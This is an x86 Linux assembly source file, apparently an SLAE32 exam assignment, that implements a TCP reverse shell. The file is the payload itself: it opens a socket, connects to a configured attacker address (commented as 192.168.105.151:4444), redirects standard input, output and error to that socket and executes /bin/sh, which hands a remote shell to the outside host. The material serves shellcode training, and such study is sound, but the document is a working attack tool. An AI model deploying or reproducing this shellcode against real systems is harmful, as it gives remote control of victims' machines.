; tcp_reverse_shell_x86.nasm 
; Author: Jack McBride (PA-6483)
; Website: https://jacklgmcbride.co.uk
; 
; Purpose: SLAE32 exam assignment
;
; Assignment 2: Linux x86 TCP Reverse Shell


global _start

section .text

_start:
			; Linux x86 reverse tcp shell
			; set up socket()
			; set up connect()
			; set up dup2()
			; set up execve()

_socket:

	; Clear EAX register and set al to syscall number 102 in hex.
	xor eax, eax
	mov al, 0x66 

	; Clear EBX register and set bl to 0x1 for socket.
	xor ebx, ebx
	mov bl, 0x1

	; Clear ECX register and push values for protocol, type and domain to the stack
	xor ecx, ecx
	push ecx;	protocol - 0 (0x00000000)
	push 0x1;	type - 1 (0x1)
	push 0x2;	domain - PF_INET (0x2)

	; Set ECX to the top of the stack to point to args
	mov ecx, esp

	; Execute socket() syscall
	int 0x80

_connect:

	; Clear EDX register and save the sockfd value returned from socket()
	xor edx, edx
	mov edx, eax

	; Clear EAX register and set al to syscall number 102 in hex.
	xor eax, eax
	mov al, 0x66

	; clear EBX register and set bl to 0x3 for connect.
	xor ebx, ebx
	mov bl, 0x3

	; Clear EDI register and push value for IP address.
	xor edi, edi
	mov edi, ADDRESS
	; XOR EDI to get original IP address hex value whilst avoiding null bytes.
	xor edi, 0xffffffff

	; Clear ECX register and push IP address
	xor ecx, ecx
	push edi;		sin_addr - 192.168.105.151 (0x6896573f)
	push word PORT;		sin_port - 4444 (0x5c11)
	push word 0x2;		sin_family - AF_INET (2)

	; Save pointer to sockaddr to ESI register
	mov esi, esp

	push 0x10;		addrlen - 16 (0x10)
	push esi;		addr
	push edx;		sockfd

	; Set ECX to stop of stack for syscall arguments *args
	mov ecx, esp

	; Execute connect() syscall
	int 0x80

_dup2:

	; Push the EDX register containing the socket file descriptor return from socket()
	push edx

	; Clear EAX register and set al to syscall number 63 in hex.
	mov al, 0x3f
	
	pop ebx;	POP socket file descriptor into EBX register for dup2 syscall
	
	xor ecx, ecx;	Clear ECX register for initial redirection of STDIN (0)
	int 0x80;	Execute dup2() syscall

	; set dup2() syscall for STDOUT (1)
	mov al, 0x3f
	mov cl, 0x1
	int 0x80

	
	; set dup2() syscall for STDERR (2)
	mov al, 0x3f
	mov cl, 0x2
	int 0x80

_execve:
	; Clear EAX register and set al to syscall number 11 in hex.
	mov al, 0xb

        ; Push pathname string to the stack and set the EBX register to it
        xor ebx, ebx
        push ebx;                       NULL terminate the string
        push 0x68732f6e;                hs/n - 0x68732f6e
        push 0x69622f2f;                ib// - 0x69622f2f
        mov ebx, esp;

        ; Clear the ECX and EDX registers for argv and envp
        xor ecx, ecx
        xor edx, edx

        ; Execute execve() syscall
        int 0x80
